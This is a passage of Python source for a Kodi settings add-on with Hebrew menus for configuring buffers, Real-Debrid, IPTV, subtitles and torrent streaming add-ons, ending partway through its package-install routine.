# -*- coding: utf-8 -*-
import xbmcaddon,os,xbmc,xbmcgui,urllib,re,xbmcplugin,sys, xbmcvfs
import traceback,json
import logging,shutil,glob
import time
from shutil import copyfile
import platform
import base64
KODI_VERSION = int(xbmc.getInfoLabel("System.BuildVersion").split('.', 1)[0])
if KODI_VERSION<=18:
    translatepath=xbmc.translatePath

else:#קודי19
    translatepath=xbmcvfs.translatePath
try:
    from urllib.request import urlopen
    from urllib.request import Request
except ImportError:
    from urllib2 import urlopen
    from urllib2 import Request
if KODI_VERSION<=18:
    que=urllib.quote_plus
    url_encode=urllib.urlencode
else:
    que=urllib.parse.quote_plus
    url_encode=urllib.parse.urlencode
if KODI_VERSION<=18:
    unque=urllib.unquote_plus
else:
    unque=urllib.parse.unquote_plus
def platform():
	if xbmc.getCondVisibility('system.platform.android'):             return 'android'
	elif xbmc.getCondVisibility('system.platform.linux'):             return 'linux'
	elif xbmc.getCondVisibility('system.platform.linux.Raspberrypi'): return 'linux'
	elif xbmc.getCondVisibility('system.platform.windows'):           return 'windows'
	elif xbmc.getCondVisibility('system.platform.osx'):               return 'osx'
	elif xbmc.getCondVisibility('system.platform.atv2'):              return 'atv2'
	elif xbmc.getCondVisibility('system.platform.ios'):               return 'ios'
	elif xbmc.getCondVisibility('system.platform.darwin'):            return 'ios'
def replaceHTMLCodes(txt):
    try:
        import HTMLParser
        html_parser = HTMLParser.HTMLParser()
       
    except:
        import html as html_parser
    txt = re.sub("(&#[0-9]+)([^;^0-9]+)", "\\1;\\2", txt)
    txt = html_parser.unescape(txt)
    txt = txt.replace("&quot;", "\"")
    txt = txt.replace("&amp;", "&")
    txt = txt.replace("&#8211", "-")
    txt = txt.replace("&#8217", "'")
    txt = txt.strip()
    return txt
HOME           = translatepath('special://home/')
ADDONS         = os.path.join(HOME,     'addons')
KODIV          = float(xbmc.getInfoLabel("System.BuildVersion")[:4])
_plugin_name_='plugin.program.Settingz-Anon'
__debuging__="DEBUG_MODE"
__USERAGENT__ = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11'
__settings__ = xbmcaddon.Addon(id=_plugin_name_)
addonName = __settings__.getAddonInfo("name")
addonIcon = __settings__.getAddonInfo('icon')
__language__ = __settings__.getLocalizedString
#__cachePeriod__ = __settings__.getSetting("cache")
__PLUGIN_PATH__ = __settings__.getAddonInfo('path')
__DEBUG__ = __settings__.getSetting("DEBUG") == "true"
__addon__ = xbmcaddon.Addon()
ADDON=xbmcaddon.Addon(id=_plugin_name_)
__addonname__ = __addon__.getAddonInfo('name')
__icon__ = __addon__.getAddonInfo('icon')
sys.modules["__main__"].dbg = True
__USERAGENT__ = 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.97 Safari/537.11'
#cacheServer = StorageServer.StorageServer("plugin.video.Ebs_RSS", __cachePeriod__)  # (Your plugin name, Cache time in hours)
AddonID = _plugin_name_
Addon = xbmcaddon.Addon(AddonID)
localizedString = Addon.getLocalizedString 
try:
    user_dataDir = translatepath(Addon.getAddonInfo("profile")).decode("utf-8")
except:
       user_dataDir = translatepath(Addon.getAddonInfo("profile"))
     
LIB_PATH = translatepath( os.path.join( __PLUGIN_PATH__, 'resources', 'mail' ) )
sys.path.append (LIB_PATH)
COLOR1         = 'yellow'
COLOR2         = 'white'
plugin='plugin.program.Anonymous'
plugin2='skin.Meir.mod'
try:
    try:
     Addon = xbmcaddon.Addon(id=plugin)
    except: Addon = xbmcaddon.Addon(id=plugin2)
except:pass
# COLOR2='yellow'
# COLOR1='white'
ADDONTITLE='Meir Build'
iconx = Addon.getAddonInfo('icon')
DIALOG         = xbmcgui.Dialog()
def LogNotify(title, message, times=3500, icon=iconx,sound=False):
	DIALOG.notification(title, message, icon, int(times), sound)
def LogNotify2(title, message, times=500, icon=iconx,sound=False):
	DIALOG.notification(title, message, icon, int(times), sound)
def get_params():
        param=[]
        if len(sys.argv)>=2:
          paramstring=sys.argv[2]
          if len(paramstring)>=2:
                params=sys.argv[2]
                cleanedparams=params.replace('?','')
                if (params[len(params)-1]=='/'):
                        params=params[0:len(params)-2]
                pairsofparams=cleanedparams.split('&')
                param={}
                for i in range(len(pairsofparams)):
                        splitparams={}
                        splitparams=pairsofparams[i].split('=')
                        if (len(splitparams))==2:
                                param[splitparams[0]]=splitparams[1]
                                
        return param     
def addDir( name, url, mode, iconimage='DefaultFolder.png'  , fanart='',summary='',isRealFolder=True):
        try:
           
            u = sys.argv[0] + "?url=" + que(url) + "&mode=" + str(mode) + "&name=" + name 
            try:
                liz = xbmcgui.ListItem( name, iconImage=iconimage, thumbnailImage=iconimage)
            except:
                liz = xbmcgui.ListItem( name)
                liz.setArt({'thumb' : iconimage, 'fanart': iconimage, 'icon': iconimage})
            liz.setInfo(type="Video", infoLabels={ "Title": urllib.unquote( name), "Plot": urllib.unquote(summary)})
            liz.setProperty('IsPlayable', 'false')
            if not fanart == '':
                liz.setProperty("Fanart_Image", fanart)
               
            ok = xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]), url=u, listitem=liz, isFolder=isRealFolder)
            if __DEBUG__:
                 
                print ("added directory success:" + clean(contentType, name) + " url=" + clean('utf-8',u))
            return ok
        except Exception as e:
            print ("WALLA exception in addDir")
            print (e)
            raise
     
def addDir2_2(name,url,mode,iconimage,fanart,description):

        uinstall_package=sys.argv[0]+"?url="+que(url)+"&mode="+str(mode)+"&name="+que(name)+"&iconimage="+que(iconimage)+"&fanart="+que(fanart)+"&description="+que(description)
        ok=True
        try:
            liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        except:
            liz=xbmcgui.ListItem(name)
            liz.setArt({'thumb' : iconimage, 'fanart': iconimage, 'icon': iconimage})
        liz.setInfo( type="Video", infoLabels={ "Title": name, "Plot": description } )
        liz.setProperty( "Fanart_Image", fanart )
        

        
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
        
       # xbmcplugin.addSortMethod(int(sys.argv[1]), xbmcplugin.SORT_METHOD_LABEL)
        
   
        return ok
###############################################################################################################        

def addDir3(name,url,mode,iconimage,fanart,description):
        u=sys.argv[0]+"?url="+unque(url)+"&mode="+str(mode)+"&name="+unque(name)+"&iconimage="+unque(iconimage)+"&fanart="+unque(fanart)+"&description="+unque(description)
        ok=True
        try:
            liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
        except:
            liz=xbmcgui.ListItem(name)
            liz.setArt({'thumb' : iconimage, 'fanart': iconimage, 'icon': iconimage})
        liz.setInfo( type="Video", infoLabels={ "Title": name, "Plot": description } )
        liz.setProperty( "Fanart_Image", fanart )
        
        ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=True)
        
        return ok

def addDir2(name,url,mode,iconimage,fanart,description):
    u=sys.argv[0]+"?url="+unque(url)+"&mode="+str(mode)+"&name="+unque(name)
    ok=True
    try:
        liz=xbmcgui.ListItem(name, iconImage="DefaultFolder.png", thumbnailImage=iconimage)
    except:
        liz=xbmcgui.ListItem(name)
        liz.setArt({'thumb' : iconimage, 'fanart': iconimage, 'icon': iconimage})
    liz.setInfo( type="Audio", infoLabels={ "Title": name } )
    if not fanart == '':
                liz.setProperty("Fanart_Image", fanart)
    ok=xbmcplugin.addDirectoryItem(handle=int(sys.argv[1]),url=u,listitem=liz,isFolder=False)
    return ok
	
def  addons():
     addDir3("[COLOR powederblue]התקן את קיר הסרטים[/COLOR]",'plugin.',31,__PLUGIN_PATH__ + "/resources/gaia.png",__PLUGIN_PATH__ + "/resources/elementum.png","התקן את קיר הסרטים")
     addDir2("[COLOR white]התקן את Elementum[/COLOR]",'plugin.',36,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","התקן את Elementum")
     addDir2("[COLOR white]התקן את Torrenter[/COLOR]",'plugin.',34,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","התקן את Torrenter")
     #addDir2("[COLOR white]התקן את Quasar[/COLOR]",'plugin.',35,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","התקן את Quasar")
     addDir2("[COLOR white]התקן את Popcorntime[/COLOR]",'plugin.',37,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","התקן את Popcorntime")
     addDir2("[COLOR white]התקן ספקים למגנטיק[/COLOR]",'plugin.',38,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","התקן ספקים למגנטיק")
     #addDir2("[COLOR powederblue]התקן את ההרחבה לוקי[/COLOR]",'plugin.',34,__PLUGIN_PATH__ + "/resources/gaia.png",__PLUGIN_PATH__ + "/resources/elementum.png","התקן את ההרחבה לוקי")
     #addDir3("[COLOR powederblue]טורנטר[/COLOR]",'plugin.',2,__PLUGIN_PATH__ + "/resources/torrenter.png",__PLUGIN_PATH__ + "/resources/torrenter.png","התקן את טורנטר")
     #addDir3("[COLOR powederblue]Kmedia Torrent[/COLOR]",'plugin.',7,__PLUGIN_PATH__ + "/resources/kmedia.png",__PLUGIN_PATH__ + "/resources/kmedia.png","התקן את KMEDIA")
     #addDir3("[COLOR powederblue]קודי פופקורן[/COLOR]",'plugin.',3,__PLUGIN_PATH__ + "/resources/popcorn.jpg",__PLUGIN_PATH__ + "/resources/popcorn.jpg","התקן את קודי פופקורן")
     #addDir3("[COLOR powederblue]קוואסר[/COLOR]",'plugin.',9,__PLUGIN_PATH__ + "/resources/quasar.png",__PLUGIN_PATH__ + "/resources/quasar.png","התקן את קוואסר")
     #addDir3("[COLOR powederblue]גאיה[/COLOR]",'plugin.',26,__PLUGIN_PATH__ + "/resources/gaia.png",__PLUGIN_PATH__ + "/resources/elementum.png","התקן את גאיה")
     
     #addDir3("[COLOR khaki]Gdrive[/COLOR]",'plugin.',4,__PLUGIN_PATH__ + "/resources/gdrive.jpg",__PLUGIN_PATH__ + "/resources/gdrive.jpg","התקן אל גוגל דרייב")
def  buffer():
     addDir2("[COLOR white]התקנת באפר אוטומטי לפי נתוני מכשיר[/COLOR]",'plugin.',39,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","התקנת באפר אוטומטי לפי נתוני מכשיר")
     addDir2("[COLOR white]הגדר באפר עד זכרון 1.5 ראם[/COLOR]",'plugin.',11,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר באפר עד זכרון 1.5 ראם")
     addDir2("[COLOR white]הגדר באפר עד 2 ראם[/COLOR]",'plugin.',20,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר באפר עד 2 ראם")
     addDir2("[COLOR white]הגדר באפר מ 3 ראם ומעלה[/COLOR]",'plugin.',21,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר באפר מ 3 ראם ומעלה") 
     addDir2("[COLOR white]הגדר באפר למכשירי Mibox[/COLOR]",'plugin.',25,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר באפר למכשירי Mibox")
     addDir2("[COLOR white]חזרה לבאפר ברירת מחדל[/COLOR]",'plugin.',33,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","החזרה לבאפר ברירת מחדל")
     
KODIV          = float(xbmc.getInfoLabel("System.BuildVersion")[:4])
def  iptv():
     
 if xbmc.getCondVisibility('system.platform.windows') and KODIV>=17 :
     addDir2("[COLOR white]הגדר iptv קודי 17[/COLOR]",'plugin.',291,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר iptv קודי 17")
     
 if xbmc.getCondVisibility('system.platform.windows') and KODIV>=18:
     addDir2("[COLOR white]הגדר iptv קודי 18 windows[/COLOR]",'plugin.',292,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר iptv קודי 18 windows")
     
 if xbmc.getCondVisibility('system.platform.android') and KODIV>=18:
     addDir2("[COLOR white]הגדר iptv קודי 18 android[/COLOR]",'plugin.',293,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר iptv קודי 18 android")
 if xbmc.getCondVisibility('system.platform.android')and KODIV<=18 and KODIV>=17 :
     addDir2("[COLOR white]הגדר iptv קודי 17[/COLOR]",'plugin.',291,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר iptv קודי 17")
     
     
def  kodi_usermenu():
       addDir2("[COLOR white]התקן הגדרות[/COLOR]",'plugin.',48,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","התקן הגדרות")
       addDir2("[COLOR white]ביטול אפשרות למשתמשים בבילד[/COLOR]",'plugin.',49,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","ביטול אפשרות למשתמשים בבילד")
       addDir2("[COLOR white]החזר אפשרות למשתמשים בבילד[/COLOR]",'plugin.',53,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","החזר אפשרות למשתמשים בבילד")
def rd_menu():
       addDir2("[COLOR white]הגדר RD resolveurl[/COLOR]",'plugin.',55,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר RD resolveurl")
       addDir2("[COLOR white]הגדר RD SEREN[/COLOR]",'plugin.',56,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר RD SEREN")
       addDir2("[COLOR white]הגדר RD GAIA[/COLOR]",'plugin.',57,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר RD GAIA")
       addDir2("[COLOR white]הגדר RD בהרחבת ויקטורי[/COLOR]",'plugin.',42,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר RD בהרחבת ויקטורי")
       addDir2("[COLOR white]ביטול הגדרת RD בהרחבת ויקטורי[/COLOR]",'plugin.',41,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","ביטול הגדרת RD בהרחבת ויקטורי")
def main_menu():
     addDir2("[COLOR white]הגדר חשבון RD[/COLOR]",'plugin.',183,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר חשבון RD")
     addDir2("[COLOR white]ביטול חשבון RD[/COLOR]",'plugin.',184,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","ביטול חשבון RD")
     addDir2("[COLOR white]שלח לוג[/COLOR]",'plugin.',185,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","שלח לוג")
     addDir2("[COLOR white]הגדרת הפרק הבא[/COLOR]",'plugin.',186,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדרת הפרק הבא")
     addDir2("[COLOR white]הגדרות לויקטורי[/COLOR]",'plugin.',181,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדרות לויקטורי")
     addDir2("[COLOR white]אפשרויות בנגן[/COLOR]",'plugin.',182,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","אפשרויות בנגן")
     addDir2("[COLOR white]הגדר את הקיר לטלמדיה[/COLOR]",'plugin.',288,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר את הקיר לטלמדיה")
     addDir2("[COLOR white]הגדר את הקיר לויקטורי[/COLOR]",'plugin.',289,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר את הקיר לויקטורי")
     addDir2("[COLOR white]הגדר IPTV[/COLOR]",'plugin.',291,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר IPTV")
     addDir2("[COLOR white]הגדר ערוצים עידן פלוס[/COLOR]",'plugin.',295,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר ערוצים עידן פלוס")
     # addDir2("[COLOR white]הגדר iptv קודי 18 windows[/COLOR]",'plugin.',292,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר iptv קודי 18 windows")
     # addDir2("[COLOR white]הגדר iptv קודי 18 android[/COLOR]",'plugin.',293,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר iptv קודי 18 android")
     
     
     # addDir3("[COLOR yellow]הגדר IPTV[/COLOR]",'plugin.',294,__PLUGIN_PATH__ + "/resources/torrenter.png",__PLUGIN_PATH__ + "/resources/torrenter.png","הגדר IPTV")
     #if xbmc.getCondVisibility('system.platform.ios'):
       #addDir("[COLOR magenta][I]**IOS System**[/I][/COLOR]",'www.plugin.',299,__PLUGIN_PATH__ + "/resources/ios.png",__PLUGIN_PATH__ + "/resources/iso.png","זיהוי מערכת",False)
     #if xbmc.getCondVisibility('system.platform.android'):
       #addDir("[COLOR magenta][I]**Android System**[/I][/COLOR]",'www.plugin.',299,__PLUGIN_PATH__ + "/resources/android.png",__PLUGIN_PATH__ + "/resources/android.png","זיהוי מערכת",False)
     #if xbmc.getCondVisibility('system.platform.windows'):
       #addDir("[COLOR magenta][I]**Windows System**[/I][/COLOR]",'www.plugin.',299,__PLUGIN_PATH__ + "/resources/windows.png",__PLUGIN_PATH__ + "/resources/windows.png","זיהוי מערכת",False)
     addDir3("[COLOR yellow]הגדר חשבון RD[/COLOR]",'plugin.',54,__PLUGIN_PATH__ + "/resources/torrenter.png",__PLUGIN_PATH__ + "/resources/torrenter.png","הגדר חשבון RD")
     addDir3("[COLOR yellow]הגדר משתמשים בקודי בסגנון נטפליקס[/COLOR]",'plugin.',52,__PLUGIN_PATH__ + "/resources/torrenter.png",__PLUGIN_PATH__ + "/resources/torrenter.png","הגדר משתמשים בקודי בסגנון נטפליקס")
     addDir3("[COLOR yellow]התקנת הרחבות[/COLOR]",'plugin.',50,__PLUGIN_PATH__ + "/resources/torrenter.png",__PLUGIN_PATH__ + "/resources/torrenter.png","התקנת הרחבות")
     addDir3("[COLOR yellow]התקנת באפר[/COLOR]",'plugin.',51,__PLUGIN_PATH__ + "/resources/torrenter.png",__PLUGIN_PATH__ + "/resources/torrenter.png","התקנת באפר")
     # if os.path.exists(translatepath("special://home/addons/") + 'script.module.meta_Subs') or os.path.exists(translatepath("special://home/addons/") + 'script.module.meta'):

     addDir2("[COLOR white]ביטול ניגון מהיר בויקטורי[/COLOR]",'plugin.',81,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","ביטול ניגון מהיר בויקטורי")
     addDir2("[COLOR white]הפעל ניגון מהיר בויקטורי[/COLOR]",'plugin.',82,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הפעל ניגון מהיר בויקטורי")
#       addDir2("[COLOR white]הגדרת חשבון RD במכה אחת[/COLOR]",'plugin.',43,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדרת חשבון RD במכה אחת")
     addDir2("[COLOR white]הגדר הורדת כתוביות לשפה אנגלית[/COLOR]",'plugin.',44,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר הורדת כתוביות לשפה אנגלית")
     addDir2("[COLOR white]הגדר הורדת כתוביות לשפה ספרדית[/COLOR]",'plugin.',45,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר הורדת כתוביות לשפה ספרדית")
     addDir2("[COLOR white]הגדר הורדת כתוביות לשפה רוסית[/COLOR]",'plugin.',46,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר הורדת כתוביות לשפה רוסית")
     addDir2("[COLOR white]הגדר הורדת כתוביות לשפה פורטוגזית[/COLOR]",'plugin.',416,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר הורדת כתוביות לשפה רוסית")
     addDir2("[COLOR white]הגדר הורדת כתוביות לשפה עברית[/COLOR]",'plugin.',47,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","הגדר הורדת כתוביות לשפה עברית")
     addDir2("[COLOR white]עדכון נגנים מטאליק[/COLOR]",'plugin.',8,__PLUGIN_PATH__ + "/resources/metaliq.png",__PLUGIN_PATH__ + "/resources/metaliq.png","מתקינה את כל נגני מטליק")
     addDir3("[COLOR white]תיקון תצוגת סקין[/COLOR]",'plugin.',23,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","תיקון תצוגת סקין")
     addDir2("[COLOR white]איפוס טלמדיה[/COLOR]",'plugin.',70,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","איפוס טלמדיה")
     addDir2("[COLOR white]הסר סיסמת מבוגרים[/COLOR]",'plugin.',14,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הסר סיסמת מבוגרים")
     addDir2("[COLOR white]בדיקת מהירות[/COLOR]",'plugin.',40,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","בדיקת מהירות")
     addDir2("[COLOR white]התאם את הגופן לשפות אחרות[/COLOR]",'plugin.',15,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","התאם את הגופן לשפות אחרות")
     addDir2("[COLOR white]ביטול התאמת גופן[/COLOR]",'plugin.',32,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","ביטול התאמת גופן")
     addDir2("[COLOR white]תיקון שגיאה בויזארד[/COLOR]",'plugin.',16,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","תיקון שגיאה בויזארד")
     addDir2("[COLOR white]ניקוי נוגן לאחרונה[/COLOR]",'plugin.',17,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","ניקוי נוגן לאחרונה")
     addDir2("[COLOR white]הגדר דיאלוג פשוט בנגנים[/COLOR]",'plugin.',18,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר דיאלוג פשוט בנגנים")
     addDir2("[COLOR white]בטל או אפשר וידגטים[/COLOR]",'plugin.',80,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר בטל או אפשר וידגטים")
     addDir2("[COLOR white]הגדר דיאלוג מתקדם בנגנים[/COLOR]",'plugin.',19,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הגדר דיאלוג מתקדם בנגנים")
     addDir2("[COLOR white]הכנס מעל 10 אלף סרטים[/COLOR]",'plugin.',22,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","הכנס מעל 10 אלף סרטים")
     addDir2("[COLOR white]התקנה מלאה של הבילד[/COLOR]",'plugin.',29,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","התקנה מלאה של הבילד")
     #addDir2("[COLOR white]תיקון הגדרות סקין אמיננס[/COLOR]",'plugin.',24,__PLUGIN_PATH__ + "/resources/buffer.jpg",__PLUGIN_PATH__ + "/resources/buffer.jpg","תיקון הגדרות סקין אמיננס")
     #addDir2("[COLOR lightblue]ניקוי תקיות מיותרות[/COLOR]",'plugin.',10,__PLUGIN_PATH__ + "/resources/clean.jpg",__PLUGIN_PATH__ + "/resources/clean.jpg","ניקוי תקיות לא קשורות למערכת שלנו")
     addDir2("[COLOR lightblue]החלף את קיצור המקשים להפעלת ערוצים[/COLOR]",'plugin.',27,__PLUGIN_PATH__ + "/resources/clean.jpg",__PLUGIN_PATH__ + "/resources/clean.jpg","החלף את קיצור המקשים להפעלת ערוצים")
     addDir2("[COLOR lightblue]ביטול החלפת מקשים לערוצים[/COLOR]",'plugin.',28,__PLUGIN_PATH__ + "/resources/clean.jpg",__PLUGIN_PATH__ + "/resources/clean.jpg","ביטול החלפת מקשים לערוצים")
     #addDir3("[COLOR powederblue]התקן או הפעל[/COLOR]",'torrenter',12,__PLUGIN_PATH__ + "/resources/torrenter.png",__PLUGIN_PATH__ + "/resources/torrenter.png","התקן את טורנטר")
     #ActivateWindow(10001,&quot;plugin://plugin.program.Settingz/?mode=12&amp;url=torrenter&quot;,return)
def dis_or_enable_addon(addon_id,mode, enable="true"):
    import json
    addon = '"%s"' % addon_id
    if xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "true":
        logging.warning('already Enabled')
        return xbmc.log("### Skipped %s, reason = allready enabled" % addon_id)
    elif not xbmc.getCondVisibility("System.HasAddon(%s)" % addon_id) and enable == "false":
        return xbmc.log("### Skipped %s, reason = not installed" % addon_id)
    else:
        do_json = '{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}' % (addon, enable)
        query = xbmc.executeJSONRPC(do_json)
        response = json.loads(query)
        if enable == "true":
            xbmc.log("### Enabled %s, response = %s" % (addon_id, response))
        else:
            xbmc.log("### Disabled %s, response = %s" % (addon_id, response))
    if mode=='auto':
     return True
    return xbmc.executebuiltin('Container.Update(%s)' % xbmc.getInfoLabel('Container.FolderPath'))
def _iter_python26(node):
  return [node] + node.findall('.//*')
def install_package(url,with_massage,mode='manual'):
   extension=url.split("$$$")
   logging.warning(url)
   if 'http' in url:
    if not os.path.exists(translatepath("special://home/addons/") + extension[2].rstrip('\r\n').replace('%24','$')) or mode=='auto':


      logging.warning(extension)
      #downloader_is(extension[0],extension[1],with_massage)
      download(extension[0],extension[1])

      logging.warning(extension[2])
      dis_or_enable_addon(extension[2].rstrip('\r\n'),mode)
     
    elif with_massage=='yes':
      dialog = xbmcgui.Dialog()
      choice=dialog.yesno("Kodi Maintenance", '','[B][COLOR red]Already Installed[/COLOR][/B]', "Install again Any way?")
      if    choice :
        #downloader_is(extension[0],extension[1],'false')
        download(extension[0],extension[1])
        dis_or_enable_addon(extension[2].rstrip('\r\n'),mode)
        
   else:
     from xml.etree import ElementTree as et
    
     src=extension[0]
     dst=extension[1]+'/settings.xml'
     logging.warning(src)
     logging.warning(dst)
     if 'torrenter' in url:
       src2=__PLUGIN_PATH__ + "/resources/magnetic/setting.xml"
       dst2=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/script.module.magnetic' ) )+'/settings.xml'

       copyfile(src2,dst2)
       
       src3=__PLUGIN_PATH__ + "/resources/torrenter/setting_libtorrent.xml"
       dst3=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/script.module.libtorrent' ) )+'/settings.xml'

       copyfile(src3,dst3)
       string_to_change='storage'
     if 'kmedia' in url:
        string_to_change='dlpath'
     elif 'popcorn' in url:
       string_to_change='movies_download_path'
     
       # Read in the file
       file_o=translatepath("special://home/addons/") + 'plugin.video.kodipopcorntime/resources/lib/kodipopcorntime/gui/player.py'

       with open(file_o, 'r') as file :
          filedata = file.read()

        # Replace the target string
       filedata = filedata.replace(": int(xbmc.getInfoLabel('ListItem.VideoResolution')),", ": 1920,#int(xbmc.getInfoLabel('ListItem.VideoResolution')),")

        # Write the file out again
       with open(file_o, 'w') as file:
          file.write(filedata)
     elif 'gdrive' in url:
       string_to_change='NONE'
     elif 'elementum' in url:
       string_to_change='download_path'
       string_to_change2='library_path'
       src2=__PLUGIN_PATH__ + "/resources/elementum/windows_setting.xml"
       dst2=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.elementum' ) )+'/settings.xml'

       src2=__PLUGIN_PATH__ + "/resources/elementum/settings_burst.xml"
       dst2=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/script.elementum.burst' ) )+'/settings.xml'
       copyfile(src2,dst2)
     elif 'quasar' in url:
       string_to_change='download_path'
       string_to_change2='library_path'
       src2=__PLUGIN_PATH__ + "/resources/quasar/windows_setting.xml"
       dst2=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/plugin.video.quasar' ) )+'/settings.xml'

       src2=__PLUGIN_PATH__ + "/resources/quasar/settings_burst.xml"
       dst2=xbmc . translatePath ( os . path . join ( 'special://userdata' , 'addon_data/script.quasar.burst' ) )+'/settings.xml'
       copyfile(src2,dst2)
     if string_to_change!='NONE':
